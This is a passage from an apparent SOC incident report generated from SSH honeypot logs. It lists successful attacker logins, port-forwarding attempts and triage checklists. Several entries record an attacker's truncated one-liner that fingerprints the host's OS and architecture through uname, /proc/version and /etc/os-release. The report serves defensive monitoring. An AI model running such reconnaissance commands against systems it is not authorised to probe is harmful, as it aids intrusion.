| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:27:11` | `cowrie.session.connect` |
| `2026-08-29 12:27:11` | `cowrie.client.version` |
| `2026-08-29 12:27:11` | `cowrie.client.kex` |
| `2026-08-29 12:27:13` | `cowrie.login.success` |
| `2026-08-29 12:27:14` | `cowrie.session.params` |
| `2026-08-29 12:27:14` | `cowrie.command.input` |
| `2026-08-29 12:27:14` | `cowrie.command.input` |
| `2026-08-29 12:27:14` | `cowrie.command.input` |
| `2026-08-29 12:27:14` | `cowrie.command.input` |
| `2026-08-29 12:27:14` | `cowrie.command.input` |
| `2026-08-29 12:27:14` | `cowrie.command.success` |
| `2026-08-29 12:27:14` | `cowrie.command.input` |
| `2026-08-29 12:27:14` | `cowrie.command.input` |
| `2026-08-29 12:27:14` | `cowrie.command.input` |
| `2026-08-29 12:27:14` | `cowrie.command.input` |
| `2026-08-29 12:27:15` | `cowrie.log.closed` |
| `2026-08-29 12:27:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cf42c6d2fd5

| Field | Detail |
|---|---|
| **Source IP** | `82.67.175[.]124` |
| **First Seen** | 2026-08-29 12:27 |
| **Last Seen** | 2026-08-29 12:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:27:40` | `cowrie.session.connect` |
| `2026-08-29 12:27:40` | `cowrie.client.version` |
| `2026-08-29 12:27:40` | `cowrie.client.kex` |
| `2026-08-29 12:27:41` | `cowrie.login.success` |
| `2026-08-29 12:27:42` | `cowrie.direct-tcpip.request` |
| `2026-08-29 12:27:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.67.175[.]124` to AbuseIPDB if not already reported
- [ ] Block `82.67.175[.]124` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-779757957ad1

| Field | Detail |
|---|---|
| **Source IP** | `47.247.73[.]99` |
| **First Seen** | 2026-08-29 12:27 |
| **Last Seen** | 2026-08-29 12:27 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:27:47` | `cowrie.session.connect` |
| `2026-08-29 12:27:48` | `cowrie.client.version` |
| `2026-08-29 12:27:48` | `cowrie.client.kex` |
| `2026-08-29 12:27:51` | `cowrie.login.success` |
| `2026-08-29 12:27:51` | `cowrie.direct-tcpip.request` |
| `2026-08-29 12:27:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.247.73[.]99` to AbuseIPDB if not already reported
- [ ] Block `47.247.73[.]99` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9e3bc0f2bb2

| Field | Detail |
|---|---|
| **Source IP** | `111.70.11[.]38` |
| **First Seen** | 2026-08-29 12:27 |
| **Last Seen** | 2026-08-29 12:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:27:59` | `cowrie.session.connect` |
| `2026-08-29 12:28:00` | `cowrie.client.version` |
| `2026-08-29 12:28:00` | `cowrie.client.kex` |
| `2026-08-29 12:28:02` | `cowrie.login.success` |
| `2026-08-29 12:28:03` | `cowrie.direct-tcpip.request` |
| `2026-08-29 12:28:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.11[.]38` to AbuseIPDB if not already reported
- [ ] Block `111.70.11[.]38` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f51f153da2f4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 12:28 |
| **Last Seen** | 2026-08-29 12:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:28:49` | `cowrie.session.connect` |
| `2026-08-29 12:28:49` | `cowrie.client.version` |
| `2026-08-29 12:28:49` | `cowrie.client.kex` |
| `2026-08-29 12:28:51` | `cowrie.login.success` |
| `2026-08-29 12:28:53` | `cowrie.session.params` |
| `2026-08-29 12:28:53` | `cowrie.command.input` |
| `2026-08-29 12:28:53` | `cowrie.command.input` |
| `2026-08-29 12:28:53` | `cowrie.command.input` |
| `2026-08-29 12:28:53` | `cowrie.command.input` |
| `2026-08-29 12:28:53` | `cowrie.command.input` |
| `2026-08-29 12:28:53` | `cowrie.command.success` |
| `2026-08-29 12:28:53` | `cowrie.command.input` |
| `2026-08-29 12:28:53` | `cowrie.command.input` |
| `2026-08-29 12:28:53` | `cowrie.command.input` |
| `2026-08-29 12:28:53` | `cowrie.command.input` |
| `2026-08-29 12:28:53` | `cowrie.log.closed` |
| `2026-08-29 12:28:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd9a2d9b451a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 12:30 |
| **Last Seen** | 2026-08-29 12:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:30:32` | `cowrie.session.connect` |
| `2026-08-29 12:30:32` | `cowrie.client.version` |
| `2026-08-29 12:30:32` | `cowrie.client.kex` |
| `2026-08-29 12:30:34` | `cowrie.login.success` |
| `2026-08-29 12:30:35` | `cowrie.session.params` |
| `2026-08-29 12:30:35` | `cowrie.command.input` |
| `2026-08-29 12:30:35` | `cowrie.command.input` |
| `2026-08-29 12:30:35` | `cowrie.command.input` |
| `2026-08-29 12:30:35` | `cowrie.command.input` |
| `2026-08-29 12:30:35` | `cowrie.command.input` |
| `2026-08-29 12:30:35` | `cowrie.command.success` |
| `2026-08-29 12:30:35` | `cowrie.command.input` |
| `2026-08-29 12:30:35` | `cowrie.command.input` |
| `2026-08-29 12:30:35` | `cowrie.command.input` |
| `2026-08-29 12:30:35` | `cowrie.command.input` |
| `2026-08-29 12:30:35` | `cowrie.log.closed` |
| `2026-08-29 12:30:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40b8ce0efcab

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 12:32 |
| **Last Seen** | 2026-08-29 12:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:32:16` | `cowrie.session.connect` |
| `2026-08-29 12:32:16` | `cowrie.client.version` |
| `2026-08-29 12:32:16` | `cowrie.client.kex` |
| `2026-08-29 12:32:18` | `cowrie.login.success` |
| `2026-08-29 12:32:19` | `cowrie.session.params` |
| `2026-08-29 12:32:19` | `cowrie.command.input` |
| `2026-08-29 12:32:19` | `cowrie.command.input` |
| `2026-08-29 12:32:19` | `cowrie.command.input` |
| `2026-08-29 12:32:19` | `cowrie.command.input` |
| `2026-08-29 12:32:19` | `cowrie.command.input` |
| `2026-08-29 12:32:19` | `cowrie.command.success` |
| `2026-08-29 12:32:19` | `cowrie.command.input` |
| `2026-08-29 12:32:19` | `cowrie.command.input` |
| `2026-08-29 12:32:19` | `cowrie.command.input` |
| `2026-08-29 12:32:19` | `cowrie.command.input` |
| `2026-08-29 12:32:19` | `cowrie.log.closed` |
| `2026-08-29 12:32:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d4e3a1e126c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 12:33 |
| **Last Seen** | 2026-08-29 12:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:33:19` | `cowrie.session.connect` |
| `2026-08-29 12:33:19` | `cowrie.client.version` |
| `2026-08-29 12:33:19` | `cowrie.client.kex` |
| `2026-08-29 12:33:20` | `cowrie.login.success` |
| `2026-08-29 12:33:20` | `cowrie.direct-tcpip.request` |
| `2026-08-29 12:33:20` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 12:33:20` | `cowrie.direct-tcpip.data` |
| `2026-08-29 12:33:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32d0e60a5b35

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 12:34 |
| **Last Seen** | 2026-08-29 12:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:34:06` | `cowrie.session.connect` |
| `2026-08-29 12:34:06` | `cowrie.client.version` |
| `2026-08-29 12:34:06` | `cowrie.client.kex` |
| `2026-08-29 12:34:06` | `cowrie.login.success` |
| `2026-08-29 12:34:07` | `cowrie.session.params` |
| `2026-08-29 12:34:07` | `cowrie.command.input` |
| `2026-08-29 12:34:07` | `cowrie.command.input` |
| `2026-08-29 12:34:07` | `cowrie.command.input` |
| `2026-08-29 12:34:08` | `cowrie.command.input` |
| `2026-08-29 12:34:08` | `cowrie.command.input` |
| `2026-08-29 12:34:08` | `cowrie.command.success` |
| `2026-08-29 12:34:08` | `cowrie.command.input` |
| `2026-08-29 12:34:08` | `cowrie.command.input` |
| `2026-08-29 12:34:08` | `cowrie.command.input` |
| `2026-08-29 12:34:08` | `cowrie.command.input` |
| `2026-08-29 12:34:08` | `cowrie.log.closed` |
| `2026-08-29 12:34:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2e9bf16d102

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 12:34 |
| **Last Seen** | 2026-08-29 12:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:34:34` | `cowrie.session.connect` |
| `2026-08-29 12:34:34` | `cowrie.client.version` |
| `2026-08-29 12:34:34` | `cowrie.client.kex` |
| `2026-08-29 12:34:35` | `cowrie.login.success` |
| `2026-08-29 12:34:35` | `cowrie.direct-tcpip.request` |
| `2026-08-29 12:34:35` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 12:34:35` | `cowrie.direct-tcpip.data` |
| `2026-08-29 12:34:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4549e8e18491

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 12:36 |
| **Last Seen** | 2026-08-29 12:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:36:13` | `cowrie.session.connect` |
| `2026-08-29 12:36:13` | `cowrie.client.version` |
| `2026-08-29 12:36:13` | `cowrie.client.kex` |
| `2026-08-29 12:36:14` | `cowrie.login.success` |
| `2026-08-29 12:36:14` | `cowrie.session.params` |
| `2026-08-29 12:36:14` | `cowrie.command.input` |
| `2026-08-29 12:36:14` | `cowrie.command.input` |
| `2026-08-29 12:36:14` | `cowrie.command.input` |
| `2026-08-29 12:36:14` | `cowrie.command.input` |
| `2026-08-29 12:36:14` | `cowrie.command.input` |
| `2026-08-29 12:36:14` | `cowrie.command.success` |
| `2026-08-29 12:36:14` | `cowrie.command.input` |
| `2026-08-29 12:36:14` | `cowrie.command.input` |
| `2026-08-29 12:36:14` | `cowrie.command.input` |
| `2026-08-29 12:36:14` | `cowrie.command.input` |
| `2026-08-29 12:36:15` | `cowrie.log.closed` |
| `2026-08-29 12:36:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a41915d0a7e7

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 12:38 |
| **Last Seen** | 2026-08-29 12:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:38:13` | `cowrie.session.connect` |
| `2026-08-29 12:38:13` | `cowrie.client.version` |
| `2026-08-29 12:38:13` | `cowrie.client.kex` |
| `2026-08-29 12:38:15` | `cowrie.login.success` |
| `2026-08-29 12:38:17` | `cowrie.session.params` |
| `2026-08-29 12:38:17` | `cowrie.command.input` |
| `2026-08-29 12:38:17` | `cowrie.command.input` |
| `2026-08-29 12:38:17` | `cowrie.command.input` |
| `2026-08-29 12:38:17` | `cowrie.command.input` |
| `2026-08-29 12:38:17` | `cowrie.command.input` |
| `2026-08-29 12:38:17` | `cowrie.command.success` |
| `2026-08-29 12:38:17` | `cowrie.command.input` |
| `2026-08-29 12:38:17` | `cowrie.command.input` |
| `2026-08-29 12:38:17` | `cowrie.command.input` |
| `2026-08-29 12:38:17` | `cowrie.command.input` |
| `2026-08-29 12:38:18` | `cowrie.log.closed` |
| `2026-08-29 12:38:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39761a75b97d

| Field | Detail |
|---|---|
| **Source IP** | `103.203.74[.]119` |
| **First Seen** | 2026-08-29 12:38 |
| **Last Seen** | 2026-08-29 12:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:38:35` | `cowrie.session.connect` |
| `2026-08-29 12:38:36` | `cowrie.client.version` |
| `2026-08-29 12:38:36` | `cowrie.client.kex` |
| `2026-08-29 12:38:38` | `cowrie.login.success` |
| `2026-08-29 12:38:38` | `cowrie.direct-tcpip.request` |
| `2026-08-29 12:38:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.203.74[.]119` to AbuseIPDB if not already reported
- [ ] Block `103.203.74[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94320f7e36fb

| Field | Detail |
|---|---|
| **Source IP** | `109.233.21[.]109` |
| **First Seen** | 2026-08-29 12:38 |
| **Last Seen** | 2026-08-29 12:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:38:48` | `cowrie.session.connect` |
| `2026-08-29 12:38:48` | `cowrie.client.version` |
| `2026-08-29 12:38:48` | `cowrie.client.kex` |
| `2026-08-29 12:38:50` | `cowrie.login.success` |
| `2026-08-29 12:38:50` | `cowrie.direct-tcpip.request` |
| `2026-08-29 12:38:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.233.21[.]109` to AbuseIPDB if not already reported
- [ ] Block `109.233.21[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-710cd2880540

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 12:39 |
| **Last Seen** | 2026-08-29 12:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:39:49` | `cowrie.session.connect` |
| `2026-08-29 12:39:50` | `cowrie.client.version` |
| `2026-08-29 12:39:50` | `cowrie.client.kex` |
| `2026-08-29 12:39:52` | `cowrie.login.success` |
| `2026-08-29 12:39:53` | `cowrie.session.params` |
| `2026-08-29 12:39:53` | `cowrie.command.input` |
| `2026-08-29 12:39:53` | `cowrie.command.input` |
| `2026-08-29 12:39:53` | `cowrie.command.input` |
| `2026-08-29 12:39:53` | `cowrie.command.input` |
| `2026-08-29 12:39:53` | `cowrie.command.input` |
| `2026-08-29 12:39:53` | `cowrie.command.success` |
| `2026-08-29 12:39:53` | `cowrie.command.input` |
| `2026-08-29 12:39:54` | `cowrie.command.input` |
| `2026-08-29 12:39:54` | `cowrie.command.input` |
| `2026-08-29 12:39:54` | `cowrie.command.input` |
| `2026-08-29 12:39:54` | `cowrie.log.closed` |
| `2026-08-29 12:39:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bf76acc7d1e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 12:41 |
| **Last Seen** | 2026-08-29 12:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:41:31` | `cowrie.session.connect` |
| `2026-08-29 12:41:31` | `cowrie.client.version` |
| `2026-08-29 12:41:31` | `cowrie.client.kex` |
| `2026-08-29 12:41:33` | `cowrie.login.success` |
| `2026-08-29 12:41:34` | `cowrie.session.params` |
| `2026-08-29 12:41:34` | `cowrie.command.input` |
| `2026-08-29 12:41:34` | `cowrie.command.input` |
| `2026-08-29 12:41:34` | `cowrie.command.input` |
| `2026-08-29 12:41:34` | `cowrie.command.input` |
| `2026-08-29 12:41:34` | `cowrie.command.input` |
| `2026-08-29 12:41:34` | `cowrie.command.success` |
